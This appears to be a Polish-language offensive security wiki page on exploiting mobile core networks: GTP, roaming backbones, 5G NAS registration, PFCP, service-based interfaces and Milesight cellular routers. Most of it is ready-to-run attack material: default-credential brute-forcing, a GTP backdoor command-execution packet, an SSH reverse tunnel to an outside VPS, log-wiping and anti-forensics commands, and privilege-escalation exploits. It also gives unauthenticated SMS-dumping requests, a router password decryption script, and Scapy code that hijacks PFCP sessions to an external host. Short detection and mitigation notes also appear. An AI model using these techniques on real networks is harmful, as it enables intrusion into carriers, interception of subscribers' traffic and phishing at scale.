# Eksploatacja sieci telekomunikacyjnych (GTP / środowiska roamingowe)

{{#include ../../banners/hacktricks-training.md}}

> [!NOTE]
> Protokoły rdzenia mobilnego (GPRS Tunnelling Protocol – GTP) często przechodzą przez pół-zaufane rdzenie roamingowe GRX/IPX. Ponieważ korzystają z prostego UDP z niemal żadną autentykacją, **każde ogniwo wewnątrz perymetru telekomunikacyjnego zazwyczaj może bezpośrednio dotrzeć do rdzeniowych płaszczyzn sygnalizacyjnych**. Poniższe notatki zbierają ofensywne sztuczki zaobserwowane w warunkach rzeczywistych przeciwko SGSN/GGSN, PGW/SGW i innym węzłom EPC.

## 1. Recon & Initial Access

### 1.1  Default OSS / NE Accounts
Zadziwiająco wiele elementów sieciowych dostawców jest dostarczanych z zakodowanymi na stałe użytkownikami SSH/Telnet takimi jak `root:admin`, `dbadmin:dbadmin`, `cacti:cacti`, `ftpuser:ftpuser`, …  Dedykowany wordlist znacząco zwiększa skuteczność brute-force:
```bash
hydra -L usernames.txt -P vendor_telecom_defaults.txt ssh://10.10.10.10 -t 8 -o found.txt
```
Jeśli urządzenie udostępnia tylko management VRF, pivot through a jump host first (zobacz sekcję «SGSN Emu Tunnel» poniżej).

### 1.2  Wykrywanie hostów w GRX/IPX
Większość operatorów GRX nadal pozwala na **ICMP echo** przez szkielet sieci. Połącz `masscan` z wbudowanymi `gtpv1` UDP probes, aby szybko zmapować nasłuchiwacze GTP-C:
```bash
masscan 10.0.0.0/8 -pU:2123 --rate 50000 --router-ip 10.0.0.254 --router-mac 00:11:22:33:44:55
```
## 2. Enumeracja abonentów – `cordscan`

Poniższe narzędzie w Go generuje pakiety **GTP-C Create PDP Context Request** i zapisuje odpowiedzi. Każda odpowiedź ujawnia bieżące **SGSN / MME** obsługujące dany IMSI, a czasami także odwiedzony PLMN abonenta.
```bash
# Build
GOOS=linux GOARCH=amd64 go build -o cordscan ./cmd/cordscan

# Usage (typical):
./cordscan --imsi 404995112345678 --oper 40499 -w out.pcap
```
Kluczowe flagi:
- `--imsi` Docelowy IMSI abonenta
- `--oper` Home / HNI (MCC+MNC)
- `-w`      Zapisz surowe pakiety do pcap

Ważne stałe wewnątrz binarki można załatać, aby rozszerzyć skany:
```
pingtimeout       = 3   // seconds before giving up
pco               = 0x218080
common_tcp_ports  = "22,23,80,443,8080"
```
## 3. Wykonanie kodu przez GTP – `GTPDoor`

`GTPDoor` to niewielka usługa ELF, która **nasłuchuje na UDP 2123 i parsuje każdy przychodzący pakiet GTP-C**. Gdy payload zaczyna się od pre-shared taga, pozostała część jest odszyfrowywana (AES-128-CBC) i wykonywana przez `/bin/sh -c`. stdout/stderr są eksfiltrowane wewnątrz **Echo Response** wiadomości, dzięki czemu nigdy nie powstaje sesja wychodząca.

Minimalny pakiet PoC (Python):
```python
import gtpc, Crypto.Cipher.AES as AES
key = b"SixteenByteKey!"
cmd = b"id;uname -a"
enc = AES.new(key, AES.MODE_CBC, iv=b"\x00"*16).encrypt(cmd.ljust(32,b"\x00"))
print(gtpc.build_echo_req(tag=b"MAG1C", blob=enc))
```
Wykrywanie:
* każdy host wysyłający **unbalanced Echo Requests** do adresów IP SGSN
* flaga wersji GTP ustawiona na 1 podczas gdy message type = 1 (Echo) – odchylenie od specyfikacji

## 4. Pivoting Through the Core

### 4.1  `sgsnemu` + SOCKS5
`OsmoGGSN` dostarcza emulator SGSN zdolny **ustanowić PDP context w kierunku rzeczywistego GGSN/PGW**. Po negocjacji Linux otrzymuje nowy interfejs `tun0`, osiągalny dla partnera roamingowego.
```bash
sgsnemu -g 10.1.1.100 -i 10.1.1.10 -m 40499 -s 404995112345678 \
-APN internet -c 1 -d
ip route add 172.16.0.0/12 dev tun0
microsocks -p 1080 &   # internal SOCKS proxy
```
Przy odpowiednim firewall hair-pinningu, ten tunel omija VLAN-y tylko do sygnalizacji i ląduje bezpośrednio w **płaszczyźnie danych**.

### 4.2  SSH Reverse Tunnel over Port 53
DNS jest prawie zawsze otwarty w infrastrukturach roamingowych. Udostępnij wewnętrzną usługę SSH na swoim VPS nasłuchującą na :53 i wróć później z domu:
```bash
ssh -f -N -R 0.0.0.0:53:127.0.0.1:22 user@vps.example.com
```
Sprawdź, czy `GatewayPorts yes` jest włączone na serwerze VPS.

## 5. Covert Channels

| Kanał | Transport | Dekodowanie | Uwagi |
|---------|-----------|----------|-------|
| ICMP – `EchoBackdoor` | ICMP Echo Req/Rep | 4-byte key + 14-byte chunks (XOR) | w pełni pasywny nasłuch, brak ruchu wychodzącego |
| DNS – `NoDepDNS` | UDP 53 | XOR (key = `funnyAndHappy`) encoded in A-record octets | monitoruje subdomenę `*.nodep` |
| GTP – `GTPDoor` | UDP 2123 | AES-128-CBC blob in private IE | maskuje się w legalnym ruchu GTP-C |

Wszystkie implanty implementują watchdogi, które **timestomp** ich pliki binarne i ponownie uruchamiają się po awarii.

## 6. Defense Evasion Cheatsheet
```bash
# Remove attacker IPs from wtmp
utmpdump /var/log/wtmp | sed '/203\.0\.113\.66/d' | utmpdump -r > /tmp/clean && mv /tmp/clean /var/log/wtmp

# Disable bash history
export HISTFILE=/dev/null

# Masquerade as kernel thread
echo 0 > /proc/$$/autogroup   # hide from top/htop
printf '\0' > /proc/$$/comm    # appears as [kworker/1]

touch -r /usr/bin/time /usr/bin/chargen   # timestomp
setenforce 0                              # disable SELinux
```
## 7. Privilege Escalation na Legacy NE
```bash
# DirtyCow – CVE-2016-5195
gcc -pthread dirty.c -o dirty && ./dirty /etc/passwd

# PwnKit – CVE-2021-4034
python3 PwnKit.py

# Sudo Baron Samedit – CVE-2021-3156
python3 exploit_userspec.py
```
Wskazówka dotycząca sprzątania:
```bash
userdel firefart 2>/dev/null
rm -f /tmp/sh ; history -c
```
## 8. Zestaw narzędzi

* `cordscan`, `GTPDoor`, `EchoBackdoor`, `NoDepDNS` – custom tooling opisane w poprzednich sekcjach.
* `FScan` : intranet TCP sweeps (`fscan -p 22,80,443 10.0.0.0/24`)
* `Responder` : LLMNR/NBT-NS rogue WPAD
* `Microsocks` + `ProxyChains` : lekki SOCKS5 pivoting
* `FRP` (≥0.37) : NAT traversal / asset bridging

## 9. Ataki rejestracji 5G NAS: SUCI leaks, downgrade to EEA0/EIA0, and NAS replay

Procedura rejestracji 5G przebiega przez NAS (Non-Access Stratum) na bazie NGAP. Dopóki zabezpieczenia NAS nie zostaną aktywowane przez Security Mode Command/Complete, wiadomości początkowe są nieautentykowane i niezaszyfrowane. To okno przed aktywacją zabezpieczeń umożliwia wiele wektorów ataku, gdy możesz obserwować lub modyfikować ruch N2 (np. on-path w core, rogue gNB lub testbed).

Przebieg rejestracji (uproszczony):
- Registration Request: UE wysyła SUCI (SUPI zaszyfrowany kluczem publicznym sieci domowej) i capabilities.
- Authentication: AMF/AUSF wysyłają RAND/AUTN; UE zwraca RES*.
- Security Mode Command/Complete: negocjowane i aktywowane są integralność i szyfrowanie NAS.
- PDU Session Establishment: konfiguracja IP/QoS.

Wskazówki konfiguracji laboratorium (bez RF):
- Core: domyślne wdrożenie Open5GS wystarcza do odtworzenia przebiegów.
- UE: symulator lub urządzenie testowe; dekoduj za pomocą Wireshark.
- Active tooling: 5GReplay (przechwytywanie/modyfikowanie/odtwarzanie NAS w obrębie NGAP), Sni5Gect (sniff/patch/inject NAS w locie bez uruchamiania pełnego rogue gNB).
- Przydatne filtry wyświetlania w Wireshark:
- ngap.procedure_code == 15 (InitialUEMessage)
- nas_5g.message_type == 65 or nas-5gs.message_type == 65 (Registration Request)

### 9.1 Prywatność identyfikatorów: SUCI failures exposing SUPI/IMSI
Oczekiwane: UE/USIM musi przesyłać SUCI (SUPI zaszyfrowany kluczem publicznym sieci domowej). Znalezienie jawnego SUPI/IMSI w Registration Request wskazuje na defekt prywatności umożliwiający trwałe śledzenie subskrybenta.

Jak testować:
- Przechwyć pierwszą wiadomość NAS w InitialUEMessage i zbadaj Mobile Identity IE.
- Szybkie sprawdzenia w Wireshark:
- Powinno zostać zdekodowane jako SUCI, nie IMSI.
- Przykłady filtrów: `nas-5gs.mobile_identity.suci || nas_5g.mobile_identity.suci` powinien istnieć; brak razem z obecnością `imsi` wskazuje na ujawnienie.

Co zebrać:
- MCC/MNC/MSIN jeśli są ujawnione; loguj per-UE i śledź w czasie/miejscach.

Mitigacja:
- Wymuś UEs/USIMs korzystające wyłącznie z SUCI; generuj alerty przy wystąpieniu jakiegokolwiek IMSI/SUPI w initial NAS.

### 9.2 Zaniżanie capability do algorytmów null (EEA0/EIA0)
Tło:
- UE deklaruje obsługiwane EEA (szyfrowanie) i EIA (integralność) w UE Security Capability IE w Registration Request.
- Typowe mapowania: EEA1/EIA1 = SNOW3G, EEA2/EIA2 = AES, EEA3/EIA3 = ZUC; EEA0/EIA0 to algorytmy null.

Problem:
- Ponieważ Registration Request nie jest chroniony integralnością, atakujący on-path może wyczyścić bity capability, aby wymusić wybór EEA0/EIA0 później podczas Security Mode Command. Niektóre stosy błędnie pozwalają na algorytmy null poza usługami awaryjnymi.

Kroki ofensywne:
- Przechwyć InitialUEMessage i zmodyfikuj NAS UE Security Capability, aby reklamować tylko EEA0/EIA0.
- Z Sni5Gect zahacz wiadomość NAS i popraw bity capability przed przekazaniem dalej.
- Obserwuj, czy AMF zaakceptuje null ciphers/integrity i zakończy Security Mode z EEA0/EIA0.

Weryfikacja/widoczność:
- W Wireshark potwierdź wybrane algorytmy po Security Mode Command/Complete.
- Przykładowe wyjście pasywnego sniffera:
```
Encyrption in use [EEA0]
Integrity in use [EIA0, EIA1, EIA2]
SUPI (MCC+MNC+MSIN) 9997000000001
```
Środki zaradcze (wymagane):
- Skonfiguruj AMF/policy, aby odrzucać EEA0/EIA0 z wyjątkiem przypadków, gdy jest to ściśle wymagane (np. połączenia alarmowe).
- Preferuj wymuszanie co najmniej EEA2/EIA2; zapisuj w logach i zgłaszaj alarm dla każdego kontekstu bezpieczeństwa NAS, który negocjuje null algorithms.

### 9.3 Replay of initial Registration Request (pre-security NAS)
Ponieważ początkowy NAS nie zapewnia integralności i świeżości, przechwycony InitialUEMessage+Registration Request może zostać replayed do AMF.

Reguła PoC dla 5GReplay do przekazywania pasujących replays:
```xml
<beginning>
<property value="THEN"
property_id="101"
type_property="FORWARD"
description="Forward InitialUEMessage with Registration Request">

<!-- Trigger on NGAP InitialUEMessage (procedureCode == 15) -->
<event value="COMPUTE"
event_id="1"
description="Trigger: InitialUEMessage"
boolean_expression="ngap.procedure_code == 15"/>

<!-- Context match on NAS Registration Request (message_type == 65) -->
<event value="COMPUTE"
event_id="2"
description="Context: Registration Request"
boolean_expression="nas_5g.message_type == 65"/>

</property>
</beginning>
```
Co obserwować:
- Whether AMF accepts the replay and proceeds to Authentication; lack of freshness/context validation indicates exposure.

Mitigacje:
- Enforce replay protection/context binding at AMF; rate-limit and correlate per-GNB/UE.

### 9.4 Tooling pointers (reproducible)
- Open5GS: uruchom AMF/SMF/UPF, aby zasymulować rdzeń; obserwuj N2 (NGAP) i NAS.
- Wireshark: zweryfikuj dekodowania NGAP/NAS; zastosuj powyższe filtry, aby wyizolować Registration.
- 5GReplay: przechwyć Registration, a następnie replayuj konkretne wiadomości NGAP + NAS zgodnie z regułą.
- Sni5Gect: na żywo sniff/modify/inject NAS control-plane, aby wymusić null algorithms lub zakłócić authentication sequences.

### 9.5 Defensive checklist
- Continuously inspect Registration Request for plaintext SUPI/IMSI; block offending devices/USIMs.
- Reject EEA0/EIA0 except for narrowly defined emergency procedures; require at least EEA2/EIA2.
- Detect rogue or misconfigured infrastructure: unauthorized gNB/AMF, unexpected N2 peers.
- Alert on NAS security modes that result in null algorithms or frequent replays of InitialUEMessage.

---

## 10. Industrial Cellular Routers – Unauthenticated SMS API Abuse (Milesight UR5X/UR32/UR35/UR41) and Credential Recovery (CVE-2023-43261)

Nadużywanie udostępnionych web API przemysłowych routerów komórkowych umożliwia dyskretne, carrier-origin smishing na dużą skalę. Routery Milesight serii UR exposeują endpoint w stylu JSON-RPC pod `/cgi`. Jeśli są źle skonfigurowane, API może być wywoływane bez uwierzytelnienia, aby listować SMS inbox/outbox i, w niektórych wdrożeniach, wysyłać SMS.

Typical unauthenticated requests (same structure for inbox/outbox):
```http
POST /cgi HTTP/1.1
Host: <router>
Content-Type: application/json

{ "base": "query_outbox", "function": "query_outbox", "values": [ {"page":1,"per_page":50} ] }
```

```json
{ "base": "query_inbox", "function": "query_inbox", "values": [ {"page":1,"per_page":50} ] }
```
Odpowiedzi zawierają pola takie jak `timestamp`, `content`, `phone_number` (E.164) oraz `status` (`success` lub `failed`). Powtarzane wysyłki zakończone `failed` do tego samego numeru często są dla atakującego “capability checks”, mające na celu zweryfikowanie, czy router/SIM może dostarczyć wiadomości przed masowym wysyłem.

Przykładowe polecenie curl do exfiltrate SMS metadata:
```bash
curl -sk -X POST http://<router>/cgi \
-H 'Content-Type: application/json' \
-d '{"base":"query_outbox","function":"query_outbox","values":[{"page":1,"per_page":100}]}'
```
Uwagi dotyczące auth artifacts:
- Niektóry ruch może zawierać auth cookie, ale duża część wystawionych urządzeń odpowiada bez żadnej autoryzacji na `query_inbox`/`query_outbox`, gdy interfejs zarządzania jest dostępny z Internetu.
- W środowiskach wymagających auth, previously-leaked credentials (patrz niżej) przywracają dostęp.

Ścieżka odzyskiwania credentials – CVE-2023-43261:
- Dotknięte rodziny: UR5X, UR32L, UR32, UR35, UR41 (przed v35.3.0.7).
- Problem: web-served logs (np. `httpd.log`) są osiągalne bez uwierzytelnienia pod `/lang/log/` i zawierają zdarzenia logowania admina z hasłem zaszyfrowanym przy użyciu hardcoded AES key/IV obecnego w client-side JavaScript.
- Praktyczny dostęp i odszyfrowanie:
```bash
curl -sk http://<router>/lang/log/httpd.log | sed -n '1,200p'
# Look for entries like: {"username":"admin","password":"<base64>"}
```
Minimalny skrypt w Pythonie do odszyfrowania leaked passwords (AES-128-CBC, hardcoded key/IV):
```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
KEY=b'1111111111111111'; IV=b'2222222222222222'
enc_b64='...'  # value from httpd.log
print(unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(enc_b64)), AES.block_size).decode())
```
Hunting and detection ideas (network):
- Generuj alert dla nieautoryzowanych `POST /cgi`, których ciało JSON zawiera `base`/`function` ustawione na `query_inbox` lub `query_outbox`.
- Śledź powtarzające się wybuchy `POST /cgi` poprzedzone wpisami `status":"failed"` dotyczące wielu unikalnych numerów z tego samego adresu IP źródła (capability testing).
- Sporządź inwentaryzację routerów Milesight wystawionych do Internetu; ogranicz zarządzanie do VPN; wyłącz funkcje SMS, jeśli nie są wymagane; zaktualizuj do ≥ v35.3.0.7; rotuj poświadczenia i przeglądaj logi SMS pod kątem nieznanych wysyłek.

Shodan/OSINT pivots (examples seen in the wild):
- `http.html:"rt_title"` matches Milesight router panels.
- Google dorking for exposed logs: `"/lang/log/system" ext:log`.

Operational impact: using legitimate carrier SIMs inside routers gives very high SMS deliverability/credibility for phishing, while inbox/outbox exposure leaks sensitive metadata at scale.

---

## 11. PFCP Session Hijack & GTP-U TEID Abuse

### 11.1 PFCP Session Modification to steal flows
If you can speak PFCP on N4 (e.g., from a mis-filtered GRX/IPX segment), craft a **Session Modification Request** that inserts a duplicate PDR ID but with a *smaller* Precedence and a FAR pointing to your host. Some UPFs (e.g., OAI-cn5g) apply the first matching PDR and never check for uniqueness, so the malicious PDR hijacks all subsequent packets of that PDU session to your sink.

Minimal Scapy PoC (assumes PFCP contrib is available and you know SEID/PDR IDs):

<details>
<summary>Scapy PFCP session hijack PoC</summary>
```python
from scapy.all import *
from scapy.contrib.pfcp import *

n4 = "10.10.20.5"   # UPF N4
seid = 0x123456789abc
pdr_id = 7           # existing PDR ID in session
far_id = 77          # new malicious FAR

pkt = IP(dst=n4)/UDP(sport=8805,dport=8805)/PFCP(
S=1, seid=seid, msg_type=MODIFICATION_REQUEST)/PFCPSessionModificationRequest(
IE_list=[PDR(id=pdr_id, precedence=1, outer_header_removal=0,
far_id=fid_identifier(far_id)),
FAR(id=far_id, apply_action=0b10,  # FORWARD
forwarding_parameters=ForwardingParameters(
outer_header_creation=OuterHeaderCreation(
desc=0x0002, ipv4_address="203.0.113.55", teid=0xdeadbeef)))] )
send(pkt, verbose=False)
```
</details>

### 11.2 Wstrzykiwanie ruchu użytkownika przez spoofing TEIDs
Jeśli uplink GTP-U z backbone nie jest ACL'd, możesz odtwarzać/zgadywać **TEIDs** widziane w nagłówkach GTP-U i enkapsulować dowolny ruch IP/TCP w kierunku peer UE lub Internetu. Przykładowa konstrukcja:
```python
send(IP(dst="10.10.20.8")/UDP(dport=2152,sport=2152)/
GTP_U_Header(teid=0x7ffed00)/
IP(src="10.0.0.10",dst="1.1.1.1")/TCP(dport=443,flags="S"))
```
Połącz to z passive sniffing na N3/N6, aby poznać aktywne TEIDs; wiele PGW/UPF stacks akceptuje dowolne źródło uplink, gdy TEID się zgadza.

---

## 12. SBA/SBI Fuzzing & Cross-Service Token Attack (free5GC R17)
FivGeeFuzz (academic 2025) automatycznie wyprowadza gramatyki z 3GPP OpenAPI specs, żeby fuzz HTTP-based SBIs. W testach na free5GC odkryto osiem błędów, w tym nadużycie **Cross-Service Token**: skompromitowany NF uzyskuje access token dla Service A i ponownie używa go przeciwko Service B, ponieważ audience/issuer checks były nieobecne w target NF.

Szybki pomysł na replay (zakładając, że ukradłeś token wydany przez NRF z dowolnego NF):
```bash
# Swap :authority to the victim NF and reuse the bearer token
curl -sk -H "Authorization: Bearer $TOKEN" \
-H "Host: smf.internal" \
https://smf.internal/nsmf-pdusession/v1/sm-contexts
```
Aby przeprowadzić fuzz automatycznie przy użyciu gramatyk FivGeeFuzz:
```bash
python3 fivgeefuzz.py --nf nsmf-pdusession \
--target https://smf.internal \
--grammar grammars/nsmf-pdusession.json \
--token "$TOKEN" --threads 8 --max-cases 500
```
Monitoruj bypasses 401/403 i awarie w podach SMF/AMF; załatane buildy free5GC odrzucają niezgodne `aud`/`iss`.

---

## Pomysły na wykrywanie
1. **Jakiekolwiek urządzenie inne niż SGSN/GGSN wysyłające Create PDP Context Requests**.
2. **Nietypowe porty (53, 80, 443) otrzymujące SSH handshakes** z adresów wewnętrznych.
3. **Częste Echo Requests bez odpowiadających Echo Responses** – może wskazywać na beacony GTPDoor.
4. **Wysokie natężenie ruchu ICMP echo-reply z dużymi, niezerowymi polami identifier/sequence**.
5. 5G: **InitialUEMessage zawierający NAS Registration Requests powtarzane z identycznych endpointów** (sygnał replay).
6. 5G: **NAS Security Mode negocjujący EEA0/EIA0 poza kontekstami awaryjnymi**.
7. PFCP: **Session Modification zawierający zduplikowane PDR ID lub nagłe przekierowanie FAR do off-net IPs**.
8. SBA: **NRF wydaje tokeny, których `aud` nie odpowiada wywoływanemu NF** – wskazuje na replay Cross-Service Token.

## Referencje

- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- 3GPP TS 29.060 – GPRS Tunnelling Protocol (v16.4.0)
- 3GPP TS 29.281 – GTPv2-C (v17.6.0)
- [Demystifying 5G Security: Understanding the Registration Protocol](https://bishopfox.com/blog/demystifying-5g-security-understanding-the-registration-protocol)
- 3GPP TS 24.501 – Non-Access-Stratum (NAS) protocol for 5GS
- 3GPP TS 33.501 – Security architecture and procedures for 5G System
- [Silent Smishing: The Hidden Abuse of Cellular Router APIs (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [CVE-2023-43261 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-43261)
- [CVE-2023-43261 PoC (win3zz)](https://github.com/win3zz/CVE-2023-43261)
- [Cross-Service Token in 5G Core (API Security Blog)](https://api-security.blog/2025/09/12/cross-service-token-finding-attacks-in-5g-core-networks/)
- [PFCP Session Modification Hijack in OAI UPF](https://gitlab.eurecom.fr/oai/cn5g/oai-cn5g-upf/-/issues/33)

{{#include ../../banners/hacktricks-training.md}}
